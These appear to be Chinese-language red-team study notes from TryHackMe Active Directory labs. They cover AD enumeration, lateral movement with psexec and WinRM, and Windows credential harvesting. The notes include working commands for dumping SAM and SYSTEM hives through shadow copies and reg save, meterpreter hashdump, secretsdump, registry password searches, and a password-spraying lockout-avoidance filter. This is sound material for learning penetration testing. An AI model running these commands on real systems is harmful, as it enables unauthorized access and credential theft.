# AD

# 枚举AD

**通过CMD枚举：**

枚举所有的AD用户：  
``````
net user /domain
net user zoe.marshall /domain
枚举某一个用户的信息
``````
注意：如果用户只是少数 AD 组的一部分，则此命令将能够向我们显示组成员身份。但是，通常，在超过十个组成员身份后，该命令将无法列出所有组成员身份


**枚举AD组：**

``````
net group /domain
net group "Tier 1 Admins" /domain
枚举一个组的信息，包括成员身份
``````

枚举密码策略：
``````
net accounts
``````

## 通过powershell枚举：

通过powershell的cmdlet枚举，cmdlet可以自己编写

**Get-ADUser**

``````
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
``````
这些参数用于以下用途：

-Identity - 我们正在枚举的帐户名称  
-Properties - 将显示与帐户关联的属性，* 将显示所有属性  
-Server - 由于我们没有加入域，因此我们必须使用此参数将其指向域控制器

所以以上的命令枚举了单个用户

``````
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
查找带有stevens的用户
``````

**Get-ADGroup**

``````
Get-ADGroup -Identity Administrators -Server za.tryhackme.com
``````

可以用Get-ADGroupMember枚举组员身份
``````
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
``````

**Get-ADObject**

``````
PS C:\> $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
PS C:\> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
``````
可以使用 cmdlet 对任何 AD 对象执行更通用的搜索。例如，如果我们要查找在特定日期之后更改的所有 AD 对象

如果我们想在不锁定帐户的情况下执行密码喷射攻击，我们可以使用它来枚举 badPwdCount 大于 0 的帐户，以避免这些帐户出现在我们的攻击中：
``````
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
``````
就是看看那个账户容易被锁定，就不轻易枚举


**Get-ADDomain**

``````
Get-ADDomain -Server za.tryhackme.com
``````
枚举域

**Set-ADAccountPassword**
更改AD对象
``````
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
``````


强大的枚举工具：bloodhound


# 横向移动与旋转

## 远程生成进程

>Psexec

端口：445/TCP(SMB)  
所需的组成员身份：管理员  

psexec 的工作方式如下：  
连接到 Admin$ 共享并上传服务二进制文件。Psexec 使用 psexesvc.exe 作为名称。   
连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与C:\Windows\psexesvc.exe关联。  
创建一些命名管道来处理 stdin/stdout/stderr。  
``````
运行psexec
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
``````

>使用WinRM创建远程进程

端口：5985/TCP(WinRM HTTP)或5986/TCP(inRM HTTPS)  
所需的组成员身份：远程管理用户  
``````
从命令行连接到远程powershell会话
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
``````



>远程使用sc创建服务



>远程创建计划任务


# 凭证收集

## 基础

凭据不安全地存储在系统中的不同位置：

- 明文文件
    - 命令历史记录
    - 配置文件（Web 应用程序、FTP 文件等）
    - 与 Windows 应用程序相关的其他文件（Internet 浏览器、电子邮件客户端等）
    - 备份文件
    - 共享文件和文件夹
    - 注册表
    - 源代码
- 数据库文件
- memory
- 密码管理器
    - 内置密码管理器 （Windows）
    - 第三方：KeePass、1Password、LastPa
- Enterprise Vault 企业保管库
- 活动目录
    - 用户描述：管理员在描述中为新员工设置密码并将其保留在那里，这使得帐户容易受到未经授权的访问。
    - 组策略 SYSVOL：泄露的加密密钥允许攻击者访问管理员帐户。有关易受攻击的 SYSVOL 版本的详细信息。
    - 被忽视的热带病：包含 AD 用户的凭据，使其成为攻击者的目标。
    - AD攻击：配置错误使 AD 容易受到各种攻击，我们将在任务 9 中讨论。
- 网络嗅探

**在注册表中搜索“password”关键字**
```
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```

描述部分找到的受害者用户的密码是什么?
```
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```

## 本地windows凭据

从本地获取windows凭据有两个主要方式：
- 键盘记录器
- SAM

### 键盘记录器：
介绍：
键盘记录器是一种软件或硬件设备，用于监控和记录键盘打字活动。键盘记录器最初是为合法目的而设计的，例如软件开发或家长控制的反馈。但是，它们可能会被滥用来窃取数据。作为红队成员，在繁忙的交互式环境中通过键盘记录器查找凭据是一个不错的选择。如果我们知道受感染的目标有一个登录用户，我们可以使用 Metasploit 框架或其他工具执行键盘记录。(详细查看利用AD任务5)

### 安全帐户管理器(SAM):

SAM 是一个 Microsoft Windows 数据库，其中包含用户名和密码等本地帐户信息。SAM 数据库以加密格式存储这些详细信息，以使其更难检索。此外，在 Windows 操作系统运行时，任何用户都无法读取和访问它。但是，有各种方法和攻击可以转储 SAM 数据库的内容


**MSF的hashdump:**

第一种方法是使用内置的 Metasploit 框架功能 hashdump 来获取 SAM 数据库内容的副本。Metasploit 框架使用内存中代码注入到LSASS.exe进程来转储复制哈希。

```
meterpreter >get uid
...
meterpreter >hashdump
...
```

**卷影复制服务:**

另一种方法使用 Microsoft 卷影复制服务，该服务有助于在应用程序在卷上读取/写入时执行卷备份。
更具体地说，我们将使用 wmic 创建卷影副本。这必须通过具有管理员权限的命令提示符完成，如下所示：
- 使用管理员权限运行标准cmd.exe提示符。
- 执行 wmic 命令以创建 C： 驱动器的复制影子
- 验证步骤 2 中的创建是否可用。
- 从我们在步骤 2 中创建的卷中复制 SAM 数据库

使用WMIC创建卷C的卷影副本:
```
wmic shadowcopy call create Volume='C:\'
```
成功执行该命令后，让我们使用 Volume Shadow Copy Service 管理命令行工具来列出并确认我们具有卷的卷影副本，列出可用的卷影卷:
```
vssadmin list shadows
```

从卷影卷复制SAM和SYSTEM文件：
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
#AND
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```
然后可以将SAM和system文件传回自己的系统进行破解。

**注册表配置单元:**

保存SAM和system文件：
```
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
#AND
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```

在本地使用 Impacket SecretsDump 脚本解密 SAM 数据库：
```
python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```

